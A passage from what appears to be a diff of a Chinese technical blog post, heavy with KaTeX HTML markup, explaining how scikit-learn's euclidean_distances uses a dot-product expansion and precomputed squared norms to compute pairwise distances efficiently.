+    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em;vertical-align: -0.25em"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">o</span><span class="mord mathdefault">t</span><span class="mopen">(</span><span class="mord mathdefault">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord mathdefault">b</span><span class="mclose">)</span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 1.09722em;vertical-align: -0.283108em"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.814108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">b</span></span></span><span class="" style="margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.283108em"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right: 0.222222em"></span></span><span class="base"><span class="strut" style="height: 1.09722em;vertical-align: -0.283108em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.03588em">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.814108em"><span class="" style="margin-left: -0.03588em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">b</span></span></span><span class="" style="margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.283108em"><span class=""></span></span></span></span></span></span></span></span></span></span>，因此<span class="katex--inline"><span class="katex"><span class="katex-mathml">
+    
+     
+      
+       
+        d
+       
+       
+        i
+       
+       
+        s
+       
+       
+        t
+       
+       
+        (
+       
+       
+        a
+       
+       
+        ,
+       
+       
+        b
+       
+       
+        )
+       
+       
+        =
+       
+       
+        
+         
+          
+           x
+          
+          
+           a
+          
+          
+           2
+          
+         
+         
+          +
+         
+         
+          
+           y
+          
+          
+           a
+          
+          
+           2
+          
+         
+         
+          −
+         
+         
+          2
+         
+         
+          ∗
+         
+         
+          (
+         
+         
+          
+           x
+          
+          
+           a
+          
+         
+         
+          
+           x
+          
+          
+           b
+          
+         
+         
+          +
+         
+         
+          
+           y
+          
+          
+           a
+          
+         
+         
+          
+           y
+          
+          
+           b
+          
+         
+         
+          )
+         
+         
+          +
+         
+         
+          
+           x
+          
+          
+           b
+          
+          
+           2
+          
+         
+         
+          +
+         
+         
+          
+           y
+          
+          
+           b
+          
+          
+           2
+          
+         
+        
+       
+       
+        =
+       
+       
+        
+         
+          
+           
+            
+             
+              (
+             
+             
+              
+               x
+              
+              
+               a
+              
+             
+            
+            
+             −
+            
+            
+             
+              x
+             
+             
+              b
+             
+            
+           
+           
+            )
+           
+          
+          
+           2
+          
+         
+         
+          +
+         
+         
+          
+           
+            
+             (
+            
+            
+             
+              y
+             
+             
+              a
+             
+            
+           
+           
+            −
+           
+           
+            
+             y
+            
+            
+             b
+            
+           
+           
+            )
+           
+          
+          
+           2
+          
+         
+        
+       
+      
+      
+       dist(a, b)=sqrt{x_a^2+y_a^2-2ast(x_ax_b+y_ay_b)+x_b^2+y_b^2}=sqrt{<!-- -->{<!-- -->{<!-- -->{(x_a}-x_b})}^2+{<!-- -->{(y_a}-y_b)}^2}
+      
+     
+    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em;vertical-align: -0.25em"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">i</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord mathdefault">b</span><span class="mclose">)</span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 1.24em;vertical-align: -0.3077em"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.9323em"><span class="svg-align"><span class="pstrut" style="height: 3.2em"></span><span class="mord" style="padding-left: 1em"><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.740108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">a</span></span></span><span class="" style="margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.247em"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.03588em">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.740108em"><span class="" style="margin-left: -0.03588em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">a</span></span></span><span class="" style="margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.247em"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mord">2</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mbin">∗</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.151392em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.336108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">b</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.03588em">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.151392em"><span class="" style="margin-left: -0.03588em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.03588em">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.336108em"><span class="" style="margin-left: -0.03588em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">b</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.795908em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">b</span></span></span><span class="" style="margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.301308em"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.03588em">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.795908em"><span class="" style="margin-left: -0.03588em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">b</span></span></span><span class="" style="margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.301308em"><span class=""></span></span></span></span></span></span></span></span><span class=""><span class="pstrut" style="height: 3.2em"></span><span class="hide-tail" style="min-width: 1.02em;height: 1.28em">
+           
+            
+           </span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.3077em"><span class=""></span></span></span></span></span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 1.84em;vertical-align: -0.502996em"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 1.337em"><span class="svg-align"><span class="pstrut" style="height: 3.8em"></span><span class="mord" style="padding-left: 1em"><span class="mord"><span class="mord"><span class="mord"><span class="mord"><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.151392em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.336108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">b</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span></span><span class="mclose">)</span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.954008em"><span class="" style="margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mbin">+</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mord"><span class="mord"><span class="mord"><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.03588em">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.151392em"><span class="" style="margin-left: -0.03588em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.03588em">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.336108em"><span class="" style="margin-left: -0.03588em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">b</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mclose">)</span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.954008em"><span class="" style="margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span><span class=""><span class="pstrut" style="height: 3.8em"></span><span class="hide-tail" style="min-width: 1.02em;height: 1.88em">
+           
+            
+           </span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.502996em"><span class=""></span></span></span></span></span></span></span></span></span>。采用该公式实际是出于计算效率的考虑，如果预先算出每个向量（数据）自身的点乘dot(x,x)和dot(y,y)，则能缩减不同向量间距离的计算时间（原文见下）。比如，对于任意i来说，计算<span class="katex--inline"><span class="katex"><span class="katex-mathml">
+    
+     
+      
+       
+        d
+       
+       
+        i
+       
+       
+        s
+       
+       
+        t
+       
+       
+        (
+       
+       
+        
+         
+          
+           x
+          
+          
+           1
+          
+         
+        
+        
+         ⇀
+        
+       
+       
+        ,
+       
+       
+        
+         
+          
+           x
+          
+          
+           i
+          
+         
+        
+        
+         ⇀
+        
+       
+       
+        )
+       
+      
+      
+       dist(oversetrightharpoonup{x_1}, oversetrightharpoonup{x_i})
+      
+     
+    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1.23737em;vertical-align: -0.25em"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">i</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mopen">(</span><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.987369em"><span class=""><span class="pstrut" style="height: 3em"></span><span class=""><span class="mop"><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span></span></span></span><span class="" style="margin-left: 0em"><span class="pstrut" style="height: 3em"></span><span class="sizing reset-size6 size3 mtight"><span class="mrel mtight">⇀</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.987369em"><span class=""><span class="pstrut" style="height: 3em"></span><span class=""><span class="mop"><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.311664em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span></span></span></span><span class="" style="margin-left: 0em"><span class="pstrut" style="height: 3em"></span><span class="sizing reset-size6 size3 mtight"><span class="mrel mtight">⇀</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span>涉及<span class="katex--inline"><span class="katex"><span class="katex-mathml">
+    
+     
+      
+       
+        d
+       
+       
+        o
+       
+       
+        t
+       
+       
+        (
+       
+       
+        
+         
+          
+           x
+          
+          
+           1
+          
+         
+        
+        
+         ⇀
+        
+       
+       
+        ,
+       
+       
+        
+         
+          
+           x
+          
+          
+           1
+          
+         
+        
+        
+         ⇀
+        
+       
+       
+        )
+       
+      
+      
+       dot(oversetrightharpoonup{x_1}, oversetrightharpoonup{x_1})
+      
+     
+    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1.23737em;vertical-align: -0.25em"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">o</span><span class="mord mathdefault">t</span><span class="mopen">(</span><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.987369em"><span class=""><span class="pstrut" style="height: 3em"></span><span class=""><span class="mop"><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span></span></span></span><span class="" style="margin-left: 0em"><span class="pstrut" style="height: 3em"></span><span class="sizing reset-size6 size3 mtight"><span class="mrel mtight">⇀</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.987369em"><span class=""><span class="pstrut" style="height: 3em"></span><span class=""><span class="mop"><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span></span></span></span><span class="" style="margin-left: 0em"><span class="pstrut" style="height: 3em"></span><span class="sizing reset-size6 size3 mtight"><span class="mrel mtight">⇀</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span>这一中间值，若提前算好并临时保存这个点乘结果，则能更快地算出与向量<span class="katex--inline"><span class="katex"><span class="katex-mathml">
+    
+     
+      
+       
+        
+         
+          
+           x
+          
+          
+           1
+          
+         
+        
+        
+         ⇀
+        
+       
+      
+      
+       oversetrightharpoonup{x_1}
+      
+     
+    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1.13737em;vertical-align: -0.15em"></span><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.987369em"><span class=""><span class="pstrut" style="height: 3em"></span><span class=""><span class="mop"><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span></span></span></span><span class="" style="margin-left: 0em"><span class="pstrut" style="height: 3em"></span><span class="sizing reset-size6 size3 mtight"><span class="mrel mtight">⇀</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span></span></span></span></span>相关的所有距离。而这一点乘结果实际对应函数输入中的关键词参数X_norm_squared和Y_norm_squared。</p> 
+<blockquote> 
+ <p>This formulation has two advantages over other ways of computing distances. First, it is computationally efficient when dealing with sparse data. Second, if one argument varies but the other remains unchanged, then dot(x, x) and/or dot(y, y) can be pre-computed.</p> 
+</blockquote> 
+<p>因此，给定数据集X，调用euclidean_distances(X)函数会获得邻接矩阵M（注意此时Y=X），则M的第i行第j列元素为<span class="katex--inline"><span class="katex"><span class="katex-mathml">
+    
+     
+      
+       
+        
+         
+          
+           x
+          
+          
+           i
+          
+         
+        
+        
+         ⇀
+        
+       
+      
+      
+       oversetrightharpoonup{x_i}
+      
+     
+    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1.13737em;vertical-align: -0.15em"></span><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.987369em"><span class=""><span class="pstrut" style="height: 3em"></span><span class=""><span class="mop"><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.311664em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span></span></span></span><span class="" style="margin-left: 0em"><span class="pstrut" style="height: 3em"></span><span class="sizing reset-size6 size3 mtight"><span class="mrel mtight">⇀</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span></span></span></span></span>和<span class="katex--inline"><span class="katex"><span class="katex-mathml">
+    
+     
+      
+       
+        
+         
+          
+           x
+          
+          
+           j
+          
+         
+        
+        
+         ⇀
+        
+       
+      
+      
+       oversetrightharpoonup{x_j}
+      
+     
+    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1.27348em;vertical-align: -0.286108em"></span><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.987369em"><span class=""><span class="pstrut" style="height: 3em"></span><span class=""><span class="mop"><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.311664em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right: 0.05724em">j</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.286108em"><span class=""></span></span></span></span></span></span></span></span></span><span class="" style="margin-left: 0em"><span class="pstrut" style="height: 3em"></span><span class="sizing reset-size6 size3 mtight"><span class="mrel mtight">⇀</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.286108em"><span class=""></span></span></span></span></span></span></span></span></span></span>之间的欧式距离，理论上M应为对称矩阵。<br> <span class="katex--display"><span class="katex-display"><span class="katex"><span class="katex-mathml">
+     
+      
+       
+        
+         X
+          
+        
+         =
+          
+        
+         
+          [
+         
+         
+          
+           
+            
+             
+              
+               
+                
+                 x
+                
+                
+                 1
+                
+               
+              
+              
+               ⇀
+              
+             
+            
+           
+          
+          
+           
+            
+             
+              
+               
+                
+                 x
+                
+                
+                 2
+                
+               
+              
+              
+               ⇀
+              
+             
+            
+           
+          
+          
+           
+            
+             
+              ⋯
+             
+            
+           
+          
+          
+           
+            
+             
+              
+               
+                
+                 x
+                
+                
+                 m
+                
+               
+              
+              
+               ⇀
+              
+             
+            
+           
+          
+         
+         
+          ]
+         
+          
+        
+         =
+          
+        
+         
+          [
+         
+         
+          
+           
+            
+             
+              
+               x
+              
+              
+               11
+              
+             
+            
+           
+           
+            
+             
+              
+               x
+              
+              
+               12
+              
+             
+            
+           
+           
+            
+             
+              ⋯
+             
+            
+           
+           
+            
+             
+              
+               x
+              
+              
+               
+                1
+               
+               
+                n
+               
+              
+             
+            
+           
+          
+          
+           
+            
+             
+              
+               x
+              
+              
+               21
+              
+             
+            
+           
+           
+            
+             
+              
+               x
+              
+              
+               22
+              
+             
+            
+           
+           
+            
+             
+              ⋯
+             
+            
+           
+           
+            
+             
+              
+               x
+              
+              
+               
+                2
+               
+               
+                n
+               
+              
+             
+            
+           
+          
+          
+           
+            
+             
+              ⋯
+             
+            
+           
+           
+            
+             
+              ⋯
+             
+            
+           
+           
+            
+             
+              ⋯
+             
+            
+           
+           
+            
+             
+              ⋯
+             
+            
+           
+          
+          
+           
+            
+             
+              
+               x
+              
+              
+               
+                m
+               
+               
+                1
+               
+              
+             
+            
+           
+           
+            
+             
+              
+               x
+              
+              
+               
+                m
+               
+               
+                2
+               
+              
+             
+            
+           
+           
+            
+             
+              ⋯
+             
+            
+           
+           
+            
+             
+              
+               x
+              
+              
+               
+                m
+               
+               
+                n
+               
+              
+             
+            
+           
+          
+         
+         
+          ]
+         
+        
+       
+       
+        X;=;begin{bmatrix}oversetrightharpoonup{x_1}\oversetrightharpoonup{x_2}\cdots\oversetrightharpoonup{x_m}end{bmatrix};=;begin{bmatrix}x_{11}&amp;x_{12}&amp;cdots&amp;x_{1n}\x_{21}&amp;x_{22}&amp;cdots&amp;x_{2n}\cdots&amp;cdots&amp;cdots&amp;cdots\x_{m1}&amp;x_{m2}&amp;cdots&amp;x_{mn}end{bmatrix}
+       
+      
+     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.68333em;vertical-align: 0em"></span><span class="mord mathdefault" style="margin-right: 0.07847em">X</span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 5.24211em;vertical-align: -2.37105em"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 2.65201em"><span class=""><span class="pstrut" style="height: 3.155em"></span><span class="delimsizinginner delim-size4"><span class="">⎣</span></span></span><span class=""><span class="pstrut" style="height: 3.155em"></span><span class="delimsizinginner delim-size4"><span class="">⎢</span></span></span><span class=""><span class="pstrut" style="height: 3.155em"></span><span class="delimsizinginner delim-size4"><span class="">⎢</span></span></span><span class=""><span class="pstrut" style="height: 3.155em"></span><span class="delimsizinginner delim-size4"><span class="">⎡</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 2.15003em"><span class=""></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 2.87105em"><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.987369em"><span class=""><span class="pstrut" style="height: 3em"></span><span class=""><span class="mop"><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span></span></span></span><span class="" style="margin-left: 0em"><span class="pstrut" style="height: 3em"></span><span class="sizing reset-size6 size3 mtight"><span class="mrel mtight">⇀</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.987369em"><span class=""><span class="pstrut" style="height: 3em"></span><span class=""><span class="mop"><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span></span></span></span><span class="" style="margin-left: 0em"><span class="pstrut" style="height: 3em"></span><span class="sizing reset-size6 size3 mtight"><span class="mrel mtight">⇀</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="minner">⋯</span></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.987369em"><span class=""><span class="pstrut" style="height: 3em"></span><span class=""><span class="mop"><span class="mord"><span 